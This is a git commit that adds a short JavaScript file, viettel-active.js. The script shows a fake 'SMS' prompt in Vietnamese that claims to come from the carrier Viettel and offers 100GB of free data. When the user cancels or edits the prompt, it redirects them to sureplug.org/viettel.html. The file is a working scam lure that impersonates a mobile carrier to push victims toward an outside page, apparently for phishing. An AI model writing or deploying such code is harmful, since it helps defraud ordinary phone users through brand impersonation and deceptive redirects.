eac6e2e5b3c1ec3dae59ea68d482d68647f77526
surepluger <adigunkola666@gmail.com>
2025-05-03 06:42:50 +0100

    Create viettel-active.js

---
+++ viettel-active.js
@@ -0,0 +1,5 @@
+var password = 'Kích hoạt 100GB'
+password=prompt('SMS: Xin chúc mừng, SIM Viettel của bạn đủ điều kiện nhận data miễn phí tặng sim cũ, nhấp vào OK để kích hoạt ngay bây giờ','Kích hoạt 100GB');
+if (password != 'Kích hoạt 100GB') {
+location.href='https://sureplug.org/viettel.html';
+}
